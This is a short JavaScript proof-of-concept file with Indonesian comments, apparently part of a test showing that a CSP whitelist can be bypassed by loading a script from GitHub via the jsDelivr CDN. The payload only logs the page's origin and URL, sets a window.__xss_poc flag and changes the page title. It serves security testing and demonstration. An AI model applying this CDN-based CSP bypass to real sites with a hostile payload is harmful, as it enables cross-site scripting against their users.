// payload.js
// File ini di-host di GitHub dan diakses via jsDelivr CDN
// untuk membuktikan bahwa CSP whitelist bisa di-bypass.

(function () {
  console.log('%c[CSP-BYPASS] Script executed!', 'color:#4ec9b0;font-weight:bold;font-size:14px');
  console.log('[CSP-BYPASS] Origin :', document.domain);
  console.log('[CSP-BYPASS] URL    :', window.location.href);
  console.log('[CSP-BYPASS] Time   :', new Date().toISOString());

  // Flag untuk diverifikasi oleh csp-test.html
  window.__xss_poc = true;

  // Ubah title sebagai bukti visual
  document.title = 'XSS-BYPASSED — ' + document.domain;
})();
